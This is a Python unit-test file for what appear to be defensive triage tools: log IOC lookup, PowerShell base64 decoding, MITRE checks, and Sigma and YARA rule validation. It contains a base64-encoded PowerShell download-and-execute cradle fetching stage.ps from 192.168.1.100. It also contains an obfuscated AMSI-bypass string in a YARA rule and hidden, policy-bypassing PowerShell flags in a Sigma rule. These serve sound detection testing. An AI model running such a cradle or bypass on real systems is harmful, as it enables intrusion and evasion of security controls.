"""Tests des outils autonomes ; sorties et référentiel isolés par test."""

import json
import tempfile
import unittest
from pathlib import Path
from unittest.mock import patch

import cyber_harness.tools as tools
from cyber_harness.tools import (
    check_mitre,
    decode_powershell_b64,
    to_utc,
    validate_sigma,
    verify_ioc,
)
from cyber_harness.tools import (
    test_yara as yara_tool,
)

B64 = (
    "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBE"
    "AG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEA"
    "LgAxADAAMAAvAHMAdABhAGcAZQAuAHAAcwAnACkA"
)

SIGMA_OK = r"""
title: Test PowerShell lancé par Outlook
logsource:
  category: process_creation
  product: windows
detection:
  selection_parent:
    ParentImage|endswith: '\OUTLOOK.EXE'
  selection_cli:
    CommandLine|contains|all:
      - '-ExecutionPolicy Bypass'
      - '-WindowStyle Hidden'
  condition: all of selection_*
level: high
"""

YARA_OK = r"""
rule test_dropper {
  strings:
    $amsi = "'am' + 'siIni' + 'tFa' + 'iled'" ascii
    $c2 = "192.168.1.100" ascii
  condition: all of them
}
"""

YARA_NAIF = 'rule naif { strings: $a = "Get-WmiObject" condition: $a }'


class ToolTests(unittest.TestCase):
    def setUp(self):
        directory = tempfile.TemporaryDirectory()
        self.addCleanup(directory.cleanup)
        patcher = patch.object(tools, "OUTPUT", Path(directory.name).resolve())
        patcher.start()
        self.addCleanup(patcher.stop)
        reference = patch.object(
            tools, "MITRE_FILE", Path(__file__).parent / "fixtures/mitre_minimal.json"
        )
        reference.start()
        self.addCleanup(reference.stop)
        tools._mitre_index.cache_clear()
        self.addCleanup(tools._mitre_index.cache_clear)

    def test_verify_ioc_present(self):
        assert "web_access.log:8" in verify_ioc.invoke("203.0.113.42")

    def test_verify_ioc_absent(self):
        assert "introuvable" in verify_ioc.invoke("10.66.66.66")

    def test_verify_ioc_chemin_windows_echappe_dans_jsonl(self):
        assert "edr_events.jsonl:2" in verify_ioc.invoke(
            r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
        )

    def test_decode_b64(self):
        res = json.loads(decode_powershell_b64.invoke(B64))
        assert res["urls"] == ["http://192.168.1.100/stage.ps"]

    def test_utc_apache_et_iso(self):
        assert to_utc.invoke("15/Nov/2024:22:18:15 +0100") == "2024-11-15T21:18:15Z"
        assert to_utc.invoke("2024-11-15T21:18:22Z") == "2024-11-15T21:18:22Z"

    def test_utc_refuse_sans_fuseau(self):
        assert "fuseau" in to_utc.invoke("15/Nov/2024:22:18:15")

    def test_mitre_valide_revoquee_inexistante(self):
        assert json.loads(check_mitre.invoke("T1059.001"))["nom"] == "PowerShell"
        assert "révoquée" in check_mitre.invoke("T1562.001")
        assert "inexistant" in check_mitre.invoke("T9999")

    def test_sigma_detecte_lancement(self):
        res = json.loads(
            validate_sigma.invoke({"rule_yaml": SIGMA_OK, "filename": "regle_sigma.yml"})
        )
        assert res["detections_sur_edr"] == ["edr_events.jsonl:2 (process_create)"]

    def test_sigma_invalide(self):
        assert not json.loads(
            validate_sigma.invoke({"rule_yaml": "title: x\ndetection: {condition: sel}"})
        )["valide"]

    def test_yara_vrai_positif_sans_faux_positif(self):
        res = json.loads(yara_tool.invoke({"rule_text": YARA_OK, "filename": "regle_yara.yar"}))
        assert res["verdict"] == "OK" and not res["faux_positifs"]

    def test_yara_naif_produit_des_faux_positifs(self):
        res = json.loads(yara_tool.invoke({"rule_text": YARA_NAIF, "filename": "regle_yara.yar"}))
        assert res["faux_positifs"]
